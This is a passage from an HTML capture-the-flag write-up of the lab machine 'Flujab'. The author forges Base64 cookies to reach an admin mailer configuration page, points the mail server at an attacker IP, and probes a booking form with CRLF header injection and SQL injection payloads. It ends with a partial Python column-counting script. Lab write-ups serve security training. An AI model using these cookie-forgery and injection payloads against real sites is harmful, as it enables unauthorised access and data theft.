<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">Patient=daf23866abcb8e29ecee6d3da0caa992; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">Registered=ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9VHJ1ZQ%3D%3D; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">/?denied</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">ClownWare Proxy</span>
</code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The page redirects to <strong><code class="highlighter-rouge">/?denied</code></strong></li>
      <li>Maybe the cookie needs to be set correctly to access the page
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li><strong><code class="highlighter-rouge">https://freeflujab.htb/?book</code></strong>:
    <ul>
      <li>
        <p>Booking Form:</p>

        <p><img src="./screenshots/443_freeflujab_booking_form.png" alt="Booking Form" /></p>
      </li>
      <li>Page Source:
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...
<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"?book"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row aln-center"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-6 col-12-medium"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;b&gt;</span>Book Your Appointment Today!<span class="nt">&lt;/b&gt;</span>
      <span class="nt">&lt;br&gt;&lt;br&gt;</span>
      <span class="nt">&lt;p&gt;</span>If rou are an existing patient registered with our surgery, 
      we‚Äôre here to keep you and your loved ones as healthy as possible, 
      with expert advice on how to protect yourself from seasonal 
      illnesses and ailments, including flu.
      <span class="nt">&lt;/p&gt;</span>
      <span class="nt">&lt;p&gt;</span>Even at our fittest and healthiest, we can still catch the 
      flu. For those over 65, people with a medical condition or
      pregnant women, catching flu can be more serious and that‚Äôs
      why we are here to offer a FREE NHS funded flu vaccine.
      <span class="nt">&lt;/p&gt;</span>
      Cricklestone Doctors Surgery<span class="nt">&lt;br&gt;</span>
      NHS England.
      <span class="nt">&lt;p&gt;&lt;/p&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-6 col-12-small"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h2&gt;</span>Prefered Date: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"date"</span> <span class="na">name=</span><span class="s">"date"</span> <span class="na">value=</span><span class="s">"2018-11-30"</span> <span class="na">min=</span><span class="s">"2018-10-01"</span> <span class="na">max=</span><span class="s">"2019-03-31"</span><span class="nt">&gt;&lt;br&gt;&lt;br&gt;</span>
      Prefered Time: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"time"</span> <span class="na">name=</span><span class="s">"time"</span> <span class="na">value=</span><span class="s">"09:00"</span> <span class="na">min</span><span class="err">"</span><span class="na">09:00</span><span class="err">"=""</span> <span class="na">max=</span><span class="s">"16:45"</span><span class="nt">&gt;&lt;/h2&gt;&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"fname"</span> <span class="na">id=</span><span class="s">"contact-name"</span> <span class="na">placeholder=</span><span class="s">"Patient First Name"</span> <span class="na">required=</span><span class="s">""</span><span class="nt">&gt;&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"lname"</span> <span class="na">id=</span><span class="s">"contact-name"</span> <span class="na">placeholder=</span><span class="s">"Patient Last Name"</span> <span class="na">required=</span><span class="s">""</span><span class="nt">&gt;&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"nhsnum"</span> <span class="na">placeholder=</span><span class="s">"NHS Number (if known)"</span> <span class="na">pattern=</span><span class="s">"NHS-\d{3}-\d{3}-\d{4}"</span> <span class="na">title=</span><span class="s">" A Valid NHS Number Is Required e.g. NHS-012-345-6789"</span><span class="nt">&gt;&lt;br&gt;</span>
      <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"actions"</span><span class="nt">&gt;&lt;br&gt;</span>                            
        <span class="nt">&lt;center&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"style1"</span> <span class="na">value=</span><span class="s">"Request Appointment"</span> <span class="na">name=</span><span class="s">"submit"</span><span class="nt">&gt;&lt;/center&gt;</span>
      <span class="nt">&lt;/ul&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/form&gt;</span>
...omitted...
</code></pre></div>        </div>
      </li>
      <li>HTML Response after booking:
        <pre><code class="language-pcap">date=2018-11-30
time=09:00
fname=jebidiah
lname=anthony
nhsnum=	
submit=Request+Appointment   
</code></pre>
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...
<span class="nt">&lt;script&gt;</span>
  <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Sorry, jebidiah anthony is not a registered patient!</span><span class="dl">"</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
...omitted...
</code></pre></div>        </div>
      </li>
    </ul>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The form requires a registered patient</li>
      <li><code class="highlighter-rouge">nhsnum</code> is not a required field
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li><strong><code class="highlighter-rouge">view-source:https://freeflujab.htb/?info</code></strong>:
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...
<span class="nt">&lt;h2&gt;</span>What people say about us<span class="nt">&lt;/h2&gt;&lt;/br&gt;</span>
<span class="nt">&lt;p&gt;</span>
 <span class="nt">&lt;i&gt;</span>"My boss would fire me if i missed a day of work, or couldn't do overtime when he needs me to. The online booking system made things so easy for me to range my flu jab."<span class="nt">&lt;/i&gt;</span>
 <span class="nt">&lt;h3&gt;&lt;i&gt;</span>A. Chun<span class="nt">&lt;/i&gt;&lt;/h3&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;p&gt;</span>
  <span class="nt">&lt;i&gt;</span>"I normally hate injections, but the warm friendly atmosphere provided by the wonderful NHS staff helped dissolve all of my fears."<span class="nt">&lt;/i&gt;</span>
  <span class="nt">&lt;h3&gt;&lt;i&gt;</span>B. Smith<span class="nt">&lt;/i&gt;&lt;/h3&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;p&gt;</span>
  <span class="nt">&lt;i&gt;</span>"Having a flu jab was as easy as pie.. pizza pie"<span class="nt">&lt;/i&gt;</span>
  <span class="nt">&lt;h3&gt;&lt;i&gt;</span>L. Feggola<span class="nt">&lt;/i&gt;&lt;/h3&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;p&gt;</span>
  <span class="nt">&lt;i&gt;</span>"It so quick and painless, not to mention thousands of times safer than crossing the street!"<span class="nt">&lt;/i&gt;</span>
  <span class="nt">&lt;h3&gt;&lt;i&gt;</span>J. Walker<span class="nt">&lt;/i&gt;&lt;/h3&gt;</span>
<span class="nt">&lt;/p&gt;</span>
...omitted...
</code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>A section of the page is dedicated to patient feedbacks</li>
      <li>The feedbacks cited contain an initial and a surname</li>
      <li>Educated guesses for a registered patient:
        <ul>
          <li><strong>Johnnie Walker</strong></li>
          <li><strong>Johny Walker</strong></li>
          <li><strong>John Walker</strong></li>
          <li><strong>Jay Walker</strong>
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Re-book an appointment using educated guesses for a registered patient:
    <ul>
      <li>HTML Response:
        <pre><code class="language-pcap">date=2018-11-30
time=09:00
fname=john
lname=walker
nhsnum=	
submit=Request+Appointment   
</code></pre>
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...
<span class="nt">&lt;script&gt;</span>
  <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Error! Could not connect to a mailserver at :25!</span><span class="dl">"</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
...omitted...
</code></pre></div>        </div>
      </li>
      <li>Response Cookies:
        <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">Set-Cookie: Modus=Q29uZmlndXJlPU51bGw%3D; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/?smtp_config
Set-Cookie: Registered=ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9VHJ1ZQ%3D%3D; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=0; path=/
</span></code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
      </li>
      <li><strong>John Walker</strong> is a registered patient</li>
      <li>Decoded (Base64) <code class="highlighter-rouge">Registered</code> cookie: <strong>daf23866abcb8e29ecee6d3da0caa992=True</strong>
        <ul>
          <li>The <code class="highlighter-rouge">Registered</code> cookie is now set to <strong>True</strong></li>
        </ul>
      </li>
      <li>What if the <code class="highlighter-rouge">Modus</code> cookie is also set to <strong>True</strong>
        <ul>
          <li>Encoded (Base64) ‚Äú<strong><em>Configure=True</em></strong>‚Äù : <strong>Q29uZmlndXJlPVRydWU=</strong></li>
          <li>URL Encoded cookie: <strong>Modus=Q29uZmlndXJlPVRydWU%3D</strong></li>
        </ul>
      </li>
      <li><strong>‚Äúmailserver‚Äù</strong> could be another reference to an SMTP service
        <ul>
          <li><strong>‚Äú:25‚Äù</strong> could be the port but the <strong><em>server address</em></strong> has not yet been set</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Accessing <strong><em>/?smtp_config</em></strong> with the properly set cookies:
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">cookie</span><span class="o">=</span><span class="s2">"Modus=Q29uZmlndXJlPVRydWU%3D;Patient=daf23866abcb8e29ecee6d3da0caa992;Registered=ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9VHJ1ZQ%3D%3D;"</span>
  
curl <span class="nt">--cookie</span> <span class="nv">$cookie</span> <span class="nt">-I</span> <span class="nt">-k</span> https://freeflujab.htb/?smtp_config
</code></pre></div>    </div>
    <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">..., .. May 2019 ..:..:.. GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">ClownWare Proxy</span>
</code></pre></div>    </div>
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--cookie</span> <span class="nv">$cookie</span> <span class="nt">-k</span> https://freeflujab.htb/?smtp_config
</code></pre></div>    </div>
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"title"</span><span class="nt">&gt;</span>Mailer Configuration<span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;header</span> <span class="na">class=</span><span class="s">"style1"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h2&gt;</span>Patient Emailer Configuration Settings<span class="nt">&lt;/h2&gt;</span>
      <span class="nt">&lt;h2&gt;</span>Current Setting = SMTP: :25<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;/header&gt;</span>
    <span class="c">&lt;!-- Contact Form --&gt;</span>
    <span class="nt">&lt;section&gt;</span>
      <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"?smtp_config"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row aln-center"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-6 "</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"mailserver"</span> <span class="na">id=</span><span class="s">"email-server"</span> <span class="na">value=</span><span class="s">"smtp.flujab.htb"</span> <span class="na">pattern=</span><span class="s">"smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}"</span> <span class="na">title=</span><span class="s">" A Valid SMTP Domain Address Is Required"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"port"</span> <span class="na">id=</span><span class="s">"port"</span> <span class="na">placeholder=</span><span class="s">"25"</span> <span class="na">value=</span><span class="s">"25"</span> <span class="nt">/&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-12"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;p&gt;</span>
              WARNING: Only <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/?whitelist"</span><span class="nt">&gt;</span>whitelisted sysadmins<span class="nt">&lt;/a&gt;</span> are authorized to 
              access this page! <span class="nt">&lt;br</span> <span class="err">\</span><span class="nt">&gt;</span> If you are not supposed to 
              change these settings then don't! whitelist will be 
              auto-updated.
            <span class="nt">&lt;/p&gt;</span>
            <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"actions"</span><span class="nt">&gt;</span>
              <span class="nt">&lt;li&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"style1"</span> <span class="na">value=</span><span class="s">"Save Mail Server Config"</span> <span class="na">name=</span><span class="s">"save"</span> <span class="nt">/&gt;&lt;/li&gt;</span>
            <span class="nt">&lt;/ul&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;/section&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
...
</code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The <code class="highlighter-rouge">mailserver</code> parameter only accepts a certain pattern
        <ul>
          <li>It could be bypassed by changing the input <strong><em>value</em></strong> to anything you want</li>
          <li>It could also be bypassed by intercepting the request and changing the values there</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Set the <strong><em>mailserver</em></strong> to be you local IP address:
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">data</span><span class="o">=</span><span class="s2">"mailserver=10.10.15.10&amp;port=25&amp;save=Save+Mail+Server+Config"</span>

curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?smtp_config
</code></pre></div>    </div>
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="nt">&lt;h2&gt;</span>Patient Emailer Configuration Settings<span class="nt">&lt;/h2&gt;</span>
<span class="nt">&lt;h2&gt;</span>Current Setting = SMTP: 10.10.15.10:25<span class="nt">&lt;/h2&gt;</span>
...
</code></pre></div>    </div>
  </li>
  <li>Explore the <strong>SMTP</strong> service:
    <ol>
      <li>Set-up an SMTP server locally:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">python -m smtpd -c DebuggingServer -n 10.10.15.10:25
</span></code></pre></div>        </div>
        <ul>
          <li>From the <a href="https://docs.python.org/3/library/smtpd.html">Python smtpd documentation</a>:
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DebuggingServer Objects

class smtpd.DebuggingServer(localaddr, remoteaddr)

Create a new debugging server. Arguments are as per SMTPServer. Messages will be discarded, and printed on stdout.
</code></pre></div>            </div>
          </li>
        </ul>
      </li>
      <li>Book an appointment then check the <strong><em>mailserver</em></strong>:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">data</span><span class="o">=</span><span class="s2">"date=2018-11-30&amp;time=09:00&amp;fname=john&amp;lname=walker&amp;nhsnum=&amp;submit=Request+Appointment"</span>

curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?book
</code></pre></div>        </div>
        <ul>
          <li>mailserver:
            <pre><code class="language-smtp">---------- MESSAGE FOLLOWS ----------
Date: ..., .. May 2019 ..:..:.. +0100
To: jwalker@tuta.io
From: Nurse Julie &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:NHS-921-376-3922
Message-ID: &lt;6c7e8490856eef3377e672b3684e342b@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

  Dear Mr john walker,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------    
    REF    : NHS-921-376-3922 
    Code   : Influ-022
    Type   : Injection
    Time   : 09:00
    Date   : 2018-11-30
    LOC    : Crick026 
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.

------------ END MESSAGE ------------
</code></pre>
            <p><strong>NOTE(S)</strong>:</p>
          </li>
          <li>The <code class="highlighter-rouge">nhsnum</code> parameter was left empty during the request</li>
          <li>An <strong>NHS Number</strong> was supplied in the email</li>
        </ul>
      </li>
      <li>Request a reminder for the appointment then check the <strong><em>mailserver</em></strong>:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">data</span><span class="o">=</span><span class="s2">"nhsnum=NHS-921-376-3922&amp;submit=Send+Reminder"</span>

curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?remind
</code></pre></div>        </div>
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Email Error: You must provide at least one recipient email address.</span><span class="dl">"</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
...
</code></pre></div>        </div>
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">data</span><span class="o">=</span><span class="s2">"nhsnum=NHS-921-376-3922&amp;submit=Send+Reminder&amp;email=DutyNurse@flujab.htb"</span>

curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?remind
</code></pre></div>        </div>
        <ul>
          <li>mailserver:
            <pre><code class="language-smtp">---------- MESSAGE FOLLOWS ----------
Date: ..., .. May 2019 ..:..:.. +0100
To: DutyNurse@flujab.htb
From: Nurse Julie &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:NHS-921-376-3922
Message-ID: &lt;64c2cbafd6e671ec34e3803202871fdc@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

  Dear Mr john walker,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------    
    REF    : NHS-921-376-3922    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED 
    LOC    : Crick026
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.

------------ END MESSAGE ------------
</code></pre>
            <p><strong>NOTE(S)</strong>:</p>
          </li>
          <li>Supplying an <code class="highlighter-rouge">email</code> parameter sends a reminder over <strong><em>SMTP</em></strong></li>
          <li>Asking for a reminder cancels an appointment
            <ul>
              <li>Maybe something‚Äôs up with this page‚Ä¶</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Test the <code class="highlighter-rouge">nhsnum</code> parameter for ‚ÄúInjection‚Äù:
        <ul>
          <li>TEST #1 ‚Äì Fuzzing:
            <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">data</span><span class="o">=</span><span class="s2">"nhsnum=test&amp;submit=Send+Reminder&amp;email=DutyNurse@flujab.htb"</span>

curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?remind
</code></pre></div>            </div>
            <pre><code class="language-smtp">---------- MESSAGE FOLLOWS ----------
Date: ..., .. May 2019 ..:..:.. +0100
To: DutyNurse@flujab.htb
From: Nurse Julie &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:
Message-ID: &lt;655bc8a49b3bdd6acc1dae82abdec5fb@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

  Dear Mr john walker,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------    
    REF    : test    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED 
    LOC    : Crick026
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.

------------ END MESSAGE ------------          
</code></pre>
            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li>The <code class="highlighter-rouge">Subject</code> header changed: <code class="highlighter-rouge">Subject: Flu Jab Appointment - Ref:</code></li>
              <li>The <code class="highlighter-rouge">REF</code> changed: <code class="highlighter-rouge">REF    : test</code></li>
            </ul>
          </li>
          <li>TEST #2 ‚Äì SMTP Header Injection using CRLF:
            <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">data</span><span class="o">=</span><span class="s2">"nhsnum=NHS-921-376-3922%0d%0aSubject:%20test&amp;submit=Send+Reminder&amp;email=DutyNurse@flujab.htb"</span>

curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?remind
</code></pre></div>            </div>
            <pre><code class="language-smtp">---------- MESSAGE FOLLOWS ----------
Date: ..., .. May 2019 ..:..:.. +0100
To: DutyNurse@flujab.htb
From: Nurse Julie &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:
Message-ID: &lt;c9fb2cef453e9a4ca88691ad507d6af1@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

  Dear Mr john walker,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------    
    REF    : NHS-921-376-3922
Subject: test    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED 
    LOC    : Crick026
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.

------------ END MESSAGE ------------          
</code></pre>
            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li>The <code class="highlighter-rouge">Ref:</code> at the <code class="highlighter-rouge">Subject</code> header still remains empty</li>
              <li><code class="highlighter-rouge">\r\n</code> was only passed in <code class="highlighter-rouge">REF</code></li>
            </ul>
          </li>
          <li>TEST #3 ‚Äì SQL Injection:
            <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">data</span><span class="o">=</span><span class="s2">"nhsnum='+OR+'1'='1&amp;submit=Send+Reminder&amp;email=DutyNurse@flujab.htb"</span>

curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?remind
</code></pre></div>            </div>
            <pre><code class="language-smtp">---------- MESSAGE FOLLOWS ----------
Date: ..., .. May 2019 ..:..:.. +0100
To: DutyNurse@flujab.htb
From: Nurse Julie &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:NHS-943-475-5911
Message-ID: &lt;086a0e84f07f82f4e4f384a78f8dd9ac@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

  Dear Mr john walker,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------    
    REF    : ' OR '1'='1    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED 
    LOC    : Crick026
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.

------------ END MESSAGE ------------          
</code></pre>
            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li><code class="highlighter-rouge">Ref:NHS-943-475-5911</code> appears in the <code class="highlighter-rouge">Subject</code> header
                <ul>
                  <li>It‚Äôs different from the initial queries (<code class="highlighter-rouge">Ref:NHS-921-376-3922</code>)</li>
                </ul>
              </li>
              <li>The server is vulnerable to <strong>SQL injection</strong></li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Exploit the vulnerability in the <code class="highlighter-rouge">nhsnum</code> parameter:
        <ol>
          <li>Check what database the service is using:
            <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' OR sqlite_version()=sqlite_version() #
</span></code></pre></div>            </div>
            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li>No message goes through the server</li>
            </ul>

            <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' OR crc32('</span><span class="n">MySQL</span><span class="s1">')=crc32('</span><span class="n">MySQL</span><span class="s1">') #
</span></code></pre></div>            </div>
            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li>It returns a successful query
                <ul>
                  <li><code class="highlighter-rouge">Subject: Flu Jab Appointment - Ref:NHS-943-475-5911</code></li>
                </ul>
              </li>
              <li>The service is using <strong>MySQL</strong>
                <ul>
                  <li>SQLite will use <code class="highlighter-rouge">sqlite_master</code> to enumerate database content</li>
                  <li>MySQL will use <code class="highlighter-rouge">information_schema</code> to enumerate database content</li>
                </ul>
              </li>
            </ul>
          </li>
          <li>Check how many columns are in the original query:
            <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>

<span class="n">target</span> <span class="o">=</span> <span class="s">"https://freeflujab.htb/?remind"</span>

<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"Modus"</span><span class="p">:</span> <span class="s">"Q29uZmlndXJlPVRydWU</span><span class="si">%3</span><span class="s">D"</span><span class="p">,</span>
    <span class="s">"Patient"</span><span class="p">:</span> <span class="s">"daf23866abcb8e29ecee6d3da0caa992"</span><span class="p">,</span>
    <span class="s">"Registered"</span><span class="p">:</span>  <span class="s">"ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9VHJ1ZQ</span><span class="si">%3</span><span class="s">D</span><span class="si">%3</span><span class="s">D"</span>
<span class="p">}</span>

<span class="n">query_columns</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"nhsnum"</span><span class="p">:</span> <span class="s">"' OR '1'='1' ORDER BY </span><span class="si">%</span><span class="s">d #"</span> <span class="o">%</span> <span class="p">(</span><span class="n">query_columns</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span>
    <span class="s">"submit"</span><span class="p">:</span> <span class="s">"Send Reminder"</span><span class="p">,</span>
    <span class="s">"email"</span><span class="p">:</span> <span class="s">"DutyNurse@flujab.htb"</span>
<span class="p">}</span>

<span class="n">req</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="s">"email"</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span> <span class="k">break</span>
<span class="k">else</span><span class="p">:</span> <span class="n">query_columns</span> <span class="o">+=</span> <span class="mi">1</span>

